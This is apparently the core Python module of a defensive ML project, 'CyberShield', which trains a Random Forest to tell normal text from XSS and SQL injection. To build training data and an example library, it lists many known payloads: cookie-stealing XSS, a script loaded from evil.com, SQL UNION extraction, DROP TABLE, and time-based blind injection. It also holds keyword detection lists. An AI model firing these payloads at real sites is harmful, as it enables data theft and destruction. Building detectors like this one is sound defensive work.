"""
core.py
=======
Shared logic for CyberShield: feature engineering, a realistic synthetic
("hypothetical") data generator, model training, and prediction.

Both app.py (Streamlit UI) and api.py (Flask REST API) import from this
single file, so there is exactly one place where the ML logic can break.
"""

from __future__ import annotations

import math
import json
from collections import Counter
from datetime import datetime
from pathlib import Path

import numpy as np
import pandas as pd

from sklearn.model_selection import train_test_split, cross_val_score, StratifiedKFold
from sklearn.ensemble import RandomForestClassifier
from sklearn.metrics import (
    accuracy_score, precision_score, recall_score, f1_score, confusion_matrix,
    roc_curve, auc, precision_recall_curve
)
from sklearn.decomposition import PCA
from sklearn.preprocessing import label_binarize

try:
    import joblib
    HAVE_JOBLIB = True
except ImportError:
    HAVE_JOBLIB = False


# ═══════════════════════════════════════════════════════════════════════════
# CONSTANTS
# ═══════════════════════════════════════════════════════════════════════════

CLASS_ORDER = ["Normal", "XSS", "SQLi"]
LABEL_MAP = {i: c for i, c in enumerate(CLASS_ORDER)}

CLASS_COLORS = {"Normal": "#10b981", "XSS": "#ef4444", "SQLi": "#7c3aed"}
CLASS_BADGES = {"Normal": "badge-normal", "XSS": "badge-xss", "SQLi": "badge-sqli"}

# (severity name, color, gauge score out of 100)
SEVERITY = {
    "Normal": ("SAFE", "#10b981", 5),
    "XSS": ("HIGH", "#f59e0b", 75),
    "SQLi": ("CRITICAL", "#ef4444", 95),
}

# Real, well-known example payloads shown in the Attack Library UI tab.
ATTACK_LIBRARY = {
    "XSS": [
        ("Basic script tag", "<script>alert('XSS')</script>"),
        ("Image onerror", "<img src=x onerror=alert(document.cookie)>"),
        ("SVG payload", "<svg onload=alert(1)>"),
        ("Event handler injection", "<body onload=alert('hacked')>"),
    ],
    "SQLi": [
        ("Classic OR bypass", "1' OR '1'='1'--"),
        ("UNION-based extraction", "1 UNION SELECT null,table_name FROM information_schema.tables--"),
        ("Comment truncation", "admin'--"),
        ("Boolean blind injection", "1' AND 1=1--"),
    ],
    "Normal": [
        ("Everyday question", "What is the weather in Chennai today?"),
        ("Search query", "best budget laptops under 50000"),
        ("Contact form message", "Hi, I would like to know your business hours."),
        ("Product review", "This product works great and arrived on time."),
    ],
}

FEATURE_COLUMNS = ["payload_len", "payload_entropy", "special_char_cnt",
                   "digit_ratio", "upper_ratio", "kw_sql", "kw_xss"]


# ═══════════════════════════════════════════════════════════════════════════
# FEATURE ENGINEERING
# ═══════════════════════════════════════════════════════════════════════════

def _shannon_entropy(s: str) -> float:
    if not s:
        return 0.0
    counts = Counter(s)
    n = len(s)
    return -sum((c / n) * math.log2(c / n) for c in counts.values())


_SQL_KEYWORDS = ("select", "union", "insert", "drop", "--", "or 1=1", "' or '", "sleep(", "waitfor")
_XSS_KEYWORDS = ("<script", "onerror", "onload", "javascript:", "<img", "<svg", "onmouseover", "%3cscript")


def extract_features(payloads: list[str]) -> pd.DataFrame:
    """Turn raw text payloads into numeric features a model can learn from."""
    rows = []
    for p in payloads:
        p = p or ""
        lower = p.lower()
        length = len(p)
        special = sum(1 for ch in p if ch in "<>\"'()=;-%")
        digits = sum(1 for ch in p if ch.isdigit())
        upper = sum(1 for ch in p if ch.isupper())
        rows.append({
            "payload_len": length,
            "payload_entropy": _shannon_entropy(p),
            "special_char_cnt": special,
            "digit_ratio": digits / length if length else 0.0,
            "upper_ratio": upper / length if length else 0.0,
            "kw_sql": int(any(k in lower for k in _SQL_KEYWORDS)),
            "kw_xss": int(any(k in lower for k in _XSS_KEYWORDS)),
        })
    return pd.DataFrame(rows)


# ═══════════════════════════════════════════════════════════════════════════
# HYPOTHETICAL / SYNTHETIC DATA
# Realistic means: many distinct patterns (not one template with a word
# swapped), obfuscation tricks real attackers use, and — critically — some
# genuinely ambiguous, overlapping examples so the problem isn't trivially
# easy. Real security datasets are noisy; a model that hits 100% on them is
# almost always overfit or leaking the answer, not "good".
# ═══════════════════════════════════════════════════════════════════════════

_XSS_TEMPLATES = [
    "<script>alert('{w}')</script>",
    "<img src=x onerror=alert('{w}')>",
    "<svg onload=alert('{w}')>",
    "<body onload=alert('{w}')>",
    "<a href=javascript:alert('{w}')>click</a>",
    "\"><script>alert('{w}')</script>",
    "<ScRiPt>alert('{w}')</sCriPt>",
    "%3Cscript%3Ealert('{w}')%3C/script%3E",
    "<iframe src=javascript:alert('{w}')></iframe>",
    "<input onfocus=alert('{w}') autofocus>",
    "<div style=width:1px;height:1px onmouseover=alert('{w}')></div>",
    "'-alert('{w}')-'",
    "<img/src=\"x\"/onerror=\"alert('{w}')\">",
    "<script src=//evil.com/{w}.js></script>",
]
_SQLI_TEMPLATES = [
    "1' OR '1'='1'-- {w}",
    "{w}' UNION SELECT null,password FROM users--",
    "admin'-- {w}",
    "1' AND 1=1-- {w}",
    "' OR 'a'='a' AND '{w}'='{w}",
    "1; DROP TABLE {w}--",
    "1' OR SLEEP(5)-- {w}",
    "1' AND 1=CONVERT(int,(SELECT '{w}'))--",
    "'; WAITFOR DELAY '0:0:5'--{w}",
    "1' /*{w}*/OR/*{w}*/'1'='1",
    "{w}' AND (SELECT COUNT(*) FROM users)>0--",
    "1' UNION SELECT NULL,NULL,version()-- {w}",
]
# Deliberately includes some sentences that CONTAIN attack-adjacent words
# (select, or, cookie, script, table) but are ordinary, harmless text — this
# is what makes the dataset "hard" and realistic instead of trivially easy.
_NORMAL_TEMPLATES = [
    "What is the weather in {w} today?",
    "Best restaurants near {w}",
    "How do I reset my {w} password?",
    "Thank you for the {w}, it works well.",
    "Please schedule a meeting about {w} tomorrow.",
    "I would like to return my {w} order.",
    "Please select the best option for {w} from the list.",
    "Can you help me write a script for my {w} presentation?",
    "I lost my session cookie recipe for {w}, can you resend it?",
    "Our sales table for {w} shows growth this quarter.",
    "The union meeting about {w} was rescheduled--please confirm.",
    "1 or 2 tickets for the {w} concert, whichever is cheaper.",
    "Drop off the {w} package at the front desk after 5pm.",
    "SELECT ALL applicants for the {w} scholarship, said the coordinator.",
]
_FILLER_WORDS = ["cookie", "session", "chennai", "laptop", "mumbai", "delhi",
                 "invoice", "account", "order", "support", "billing", "report",
                 "1234", "test", "hello", "project", "table", "users"]


def generate_synthetic_dataset(n_per_class: int = 250, seed: int = 42,
                                label_noise: float = 0.03) -> pd.DataFrame:
    """
    Generate a hypothetical dataset. `label_noise` randomly flips a small
    fraction of labels (default 3%) to mimic real-world annotation noise —
    this is a standard technique and is what keeps accuracy in a believable
    range instead of an unrealistic 100%.
    """
    rng = np.random.default_rng(seed)
    records = []
    template_map = {"XSS": _XSS_TEMPLATES, "SQLi": _SQLI_TEMPLATES, "Normal": _NORMAL_TEMPLATES}

    for label, templates in template_map.items():
        for _ in range(n_per_class):
            tmpl = templates[rng.integers(0, len(templates))]
            word = _FILLER_WORDS[rng.integers(0, len(_FILLER_WORDS))]
            payload = tmpl.format(w=word)
            # small random casing/whitespace jitter for extra realism
            if rng.random() < 0.15:
                payload = payload.replace(" ", "  ", 1)
            records.append({"payload": payload, "label": label})

    df = pd.DataFrame(records).drop_duplicates(subset="payload").reset_index(drop=True)
    df = df.sample(frac=1, random_state=seed).reset_index(drop=True)

    # Inject label noise: randomly relabel a small fraction of rows
    if label_noise > 0:
        n_flip = int(len(df) * label_noise)
        flip_idx = rng.choice(df.index, size=n_flip, replace=False)
        for i in flip_idx:
            other = [c for c in CLASS_ORDER if c != df.loc[i, "label"]]
            df.loc[i, "label"] = other[rng.integers(0, len(other))]

    return df.reset_index(drop=True)


# ═══════════════════════════════════════════════════════════════════════════
# TRAINING
# ═══════════════════════════════════════════════════════════════════════════

def train_model(df: pd.DataFrame, seed: int = 42):
    """
    Train a regularized Random Forest. max_depth / min_samples_leaf are
    capped deliberately — an unconstrained forest can memorize small
    synthetic datasets and report a meaningless 100%. Capping complexity
    plus 5-fold cross-validation gives a realistic, trustworthy estimate.
    """
    X = extract_features(df["payload"].tolist())
    y = df["label"]

    X_train, X_test, y_train, y_test = train_test_split(
        X, y, test_size=0.2, random_state=seed, stratify=y
    )

    model = RandomForestClassifier(
        n_estimators=150, max_depth=6, min_samples_leaf=3,
        random_state=seed,
    )

    # 5-fold cross-validation on the training set for a more honest estimate
    cv = StratifiedKFold(n_splits=5, shuffle=True, random_state=seed)
    cv_scores = cross_val_score(model, X_train, y_train, cv=cv, scoring="f1_weighted")

    model.fit(X_train, y_train)
    preds = model.predict(X_test)

    acc = accuracy_score(y_test, preds)
    prec = precision_score(y_test, preds, average="weighted", zero_division=0)
    rec = recall_score(y_test, preds, average="weighted", zero_division=0)
    f1 = f1_score(y_test, preds, average="weighted", zero_division=0)

    labels_present = sorted(y.unique(), key=lambda c: CLASS_ORDER.index(c) if c in CLASS_ORDER else 99)
    cm = confusion_matrix(y_test, preds, labels=labels_present)

    # ROC curve data (one-vs-rest) for visualization
    y_test_bin = label_binarize(y_test, classes=labels_present)
    probas = model.predict_proba(X_test)
    roc_data = {}
    for i, cls in enumerate(labels_present):
        fpr, tpr, _ = roc_curve(y_test_bin[:, i], probas[:, i])
        roc_data[cls] = {"fpr": fpr.tolist(), "tpr": tpr.tolist(), "auc": float(auc(fpr, tpr))}

    # Precision-Recall curve data
    pr_data = {}
    for i, cls in enumerate(labels_present):
        p, r, _ = precision_recall_curve(y_test_bin[:, i], probas[:, i])
        pr_data[cls] = {"precision": p.tolist(), "recall": r.tolist()}

    # 2D PCA projection of the feature space, for a visual "shape of the data"
    pca = PCA(n_components=2, random_state=seed)
    coords = pca.fit_transform(X)
    pca_df = pd.DataFrame(coords, columns=["PC1", "PC2"])
    pca_df["label"] = y.values

    feature_importance = pd.Series(
        model.feature_importances_, index=FEATURE_COLUMNS
    ).sort_values(ascending=False)

    return {
        "model": model,
        "metadata": {
            "best_model": "RandomForestClassifier (regularized)",
            "final_accuracy": acc,
            "final_f1": f1,
            "cv_f1_mean": float(cv_scores.mean()),
            "cv_f1_std": float(cv_scores.std()),
            "trained_on": len(df),
            "trained_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        },
        "metrics": {"accuracy": acc, "precision": prec, "recall": rec, "f1": f1},
        "cv_scores": cv_scores.tolist(),
        "confusion_matrix": cm,
        "labels": labels_present,
        "class_distribution": df["label"].value_counts().reindex(CLASS_ORDER).fillna(0).astype(int),
        "roc_data": roc_data,
        "pr_data": pr_data,
        "pca_df": pca_df,
        "feature_importance": feature_importance,
        "X_test": X_test, "y_test": y_test, "test_preds": preds,
    }


def predict(payloads: list[str], model) -> dict:
    feat = extract_features(payloads)
    labels = model.predict(feat)
    probabilities = None
    confidence = None
    if hasattr(model, "predict_proba"):
        proba = model.predict_proba(feat)
        classes = list(model.classes_)
        probabilities = [
            {cls: float(p) * 100 for cls, p in zip(classes, row)} for row in proba
        ]
        confidence = [max(row.values()) for row in probabilities]
    return {"labels": list(labels), "confidence": confidence, "probabilities": probabilities, "features": feat}


# ═══════════════════════════════════════════════════════════════════════════
# LOADING A REAL, PREVIOUSLY-TRAINED MODEL FROM DISK (optional)
# ═══════════════════════════════════════════════════════════════════════════

CANDIDATE_MODEL_DIRS = [
    Path("E:/CYBERSECURITY/models"),
    Path.cwd() / "models",
    Path(__file__).parent / "models",
]


def try_load_real_model():
    if not HAVE_JOBLIB:
        return None
    for d in CANDIDATE_MODEL_DIRS:
        model_path = d / "final_model.joblib"
        meta_path = d / "metadata.json"
        if model_path.exists():
            try:
                model = joblib.load(model_path)
                metadata = json.loads(meta_path.read_text()) if meta_path.exists() else {}
                return {"model": model, "metadata": metadata, "source": str(d)}
            except Exception:
                continue
    return None
